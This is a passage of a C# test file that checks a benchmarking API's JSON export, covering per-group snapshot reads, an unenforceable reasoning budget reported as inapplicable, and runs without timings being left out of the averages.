        AssertEx.Equal(expected: 2, rows[1].GetProperty("samples").GetInt32());
    }

    [Test]
    public async Task ExportJson_ReadsTheFrozenSnapshotOncePerGroupRatherThanOncePerRun()
    {
        // Deserializing a snapshot RE-HASHES it to validate, and a llama-bench row only ever reads the first run of
        // its group. Paying that per run made a fifty-run project do fifty verifications to use five answers.
        await using var context = CreateContext();
        ArrangeProject(context);
        var groupId = Guid.Parse("70000000-0000-0000-0000-000000000007");
        ArrangeRuns(context,
            Grouped(groupId, repeatIndex: 0, warmup: false, ttftMs: 100, promptTokens: 100, promptMs: 500, generationTokens: 50, generationMs: 1000),
            Grouped(groupId, repeatIndex: 1, warmup: false, ttftMs: 200, promptTokens: 100, promptMs: 500, generationTokens: 50, generationMs: 1000),
            Grouped(groupId, repeatIndex: 2, warmup: false, ttftMs: 300, promptTokens: 100, promptMs: 500, generationTokens: 50, generationMs: 1000),
            Grouped(Guid.Parse("80000000-0000-0000-0000-000000000008"), repeatIndex: 0, warmup: false, ttftMs: 400, promptTokens: 100, promptMs: 500,
                generationTokens: 50, generationMs: 1000));
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        AssertEx.Equal("application/json; charset=utf-8", response.Content.Headers.ContentType?.ToString());
        AssertEx.Equal(expected: 2, context.Snapshots.Deserialized, "Four runs, two groups: one snapshot read per group.");
        using var document = JsonDocument.Parse(body);
        AssertEx.Equal(expected: 4, document.RootElement.GetProperty("runs").GetArrayLength(),
            "Unreadable snapshot facts must not discard otherwise exportable runs.");
        AssertEx.Equal(expected: 2, document.RootElement.GetProperty("repeatGroups").GetArrayLength(),
            "Snapshot recovery must retain both repeat groups.");
    }

    [Test]
    public async Task ExportJson_ForARunFrozenWithABudgetTheModelCannotHonour_SaysSoOnTheRun()
    {
        // The budget is exported and shown either way, so the run detail is the only place that can say it was never
        // applied. Read straight off the frozen snapshot rather than a column of its own.
        await using var context = CreateContext();
        ArrangeProject(context);
        ArrangeRuns(context,
            Run() with
            {
                RuntimeSnapshotJson = Encoding.UTF8.GetBytes("{\"primarySampling\":{\"reasoningBudgetTokens\":4096,\"reasoningBudgetEnforceable\":false}}")
            });
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        AssertEx.Equal(HttpStatusCode.OK, response.StatusCode);
        using var document = JsonDocument.Parse(body);
        var run = document.RootElement.GetProperty("runs")[0];
        AssertEx.Equal(expected: 4096, run.GetProperty("reasoningBudgetTokens").GetInt32());
        AssertEx.False(run.GetProperty("reasoningBudgetApplicable").GetBoolean(),
            "A pinned budget the frozen model cannot honour must be reported as inapplicable, not silently dropped.");

        // The snapshot itself stays unexposed — two scalars are lifted out of it, never the payload.
        AssertEx.False(body.Contains("primarySampling", StringComparison.Ordinal));
    }

    [Test]
    public async Task ExportJson_ForRunsThatMeasuredNothing_ReportsNoGroupsRatherThanZeroes()
    {
        // A run that reported no timings must contribute no sample. Summarizing it as zero would put an invented
        // measurement into the mean of every group it lands in.
        await using var context = CreateContext();
        ArrangeProject(context);
        ArrangeRuns(context, Run());
        using var client = context.Factory.CreateClient();
        using var request = Authorized(context.Factory, Api + $"/projects/{ProjectId}/export");

        using var response = await client.SendAsync(request).ConfigureAwait(false);
        var body = await response.Content.ReadAsStringAsync().ConfigureAwait(false);

        using var document = JsonDocument.Parse(body);
        AssertEx.Equal(expected: 0, document.RootElement.GetProperty("repeatGroups").GetArrayLength());
        AssertEx.Equal(expected: 0, document.RootElement.GetProperty("llamaBench").GetArrayLength());
    }

    private static BenchmarkRunRecord Grouped(Guid groupId,
        int repeatIndex,
        bool warmup,
        double ttftMs,
        int promptTokens,
        double promptMs,
        int generationTokens,
        double generationMs) =>
        Run(BenchmarkPrimaryStatus.Succeeded, runId: Guid.NewGuid()) with
        {
            RepeatGroupId = groupId,
            RepeatIndex = repeatIndex,
            IsWarmup = warmup,
            Throughput = new BenchmarkRunThroughput(ttftMs, promptTokens, promptMs, generationTokens, generationMs, CachedPromptTokens: 0,
                SegmentCount: 1)
        };

    private static BenchmarkRunRecord Run(BenchmarkPrimaryStatus primary = BenchmarkPrimaryStatus.Queued,
        string? output = null,
        Guid? judgeAttemptId = null,
        string modelName = "model",
        Guid? runId = null) =>
        new(runId ?? RunId,
            ProjectId,
            Encoding.UTF8.GetBytes("secret-runtime"),
            modelName,
            LocalModelOrigin.Imported,
            "v1:aggregate",
            "Agent",
            2,
            4096,
            primary,
            null,
            null,
            null,
            null,
            output is null ? null : Encoding.UTF8.GetBytes(output),
            0,
            null,
            null,
            3,
            10,
            null,
            null,
            20,
            Judge: new BenchmarkRunJudgeView(judgeAttemptId is null ? BenchmarkRunJudgeStates.None : BenchmarkRunJudgeStates.Succeeded,
                judgeAttemptId, null, null, null, null, null, null, null, PolicyCurrent: false, ExecutionCurrent: false, null));

    private static HttpRequestMessage Authorized(TestServerWebAppFactory factory, string path)
    {
        var request = new HttpRequestMessage(HttpMethod.Get, path);
        factory.AddNodeBearerToken(request);
        request.Headers.Add("Origin", "http://localhost");
        return request;
    }

    private static Context CreateContext() =>
        new();

    private sealed class Context : IAsyncDisposable
    {
        public IBenchmarkStore Store { get; } = Substitute.For<IBenchmarkStore>();

        /// <summary>Counts snapshot reads, which is the only way to see that the export stopped paying for one per run.</summary>
        public CountingSnapshotFactory Snapshots { get; } = new();

        public TestServerWebAppFactory Factory { get; }

        public Context() =>
            Factory = new TestServerWebAppFactory
            {
                ConfigureAdditionalTestServices = services =>
                {
                    services.RemoveAll<IBenchmarkStore>();
                    services.AddSingleton(Store);
                    services.RemoveAll<IBenchmarkRuntimeSnapshotFactory>();
                    services.AddSingleton<IBenchmarkRuntimeSnapshotFactory>(Snapshots);
                }
            };

        public ValueTask DisposeAsync() =>
            Factory.DisposeAsync();
    }

    /// <summary>
    ///     Counts <see cref="IBenchmarkRuntimeSnapshotFactory.Deserialize" /> and then refuses, which is what these
    ///     runs' placeholder payloads do against the real factory anyway — the export logs it and leaves the row's
    ///     model facts empty. Hand-written rather than substituted: the method takes a <c>ReadOnlySpan</c>, which a
    ///     mocking proxy cannot record.
    /// </summary>
    private sealed class CountingSnapshotFactory : IBenchmarkRuntimeSnapshotFactory
    {
        public int Deserialized { get; private set; }

        public BenchmarkRuntimeSnapshotV1 Create(BenchmarkRuntimeSnapshotInput input) =>
            throw new NotSupportedException();

        public byte[] Serialize(BenchmarkRuntimeSnapshotV1 snapshot) =>
            throw new NotSupportedException();

        public BenchmarkRuntimeSnapshotV1 Deserialize(ReadOnlySpan<byte> payload)
        {
            Deserialized++;
            throw new BenchmarkSnapshotException("The export test does not model a readable snapshot.");
        }
    }
}
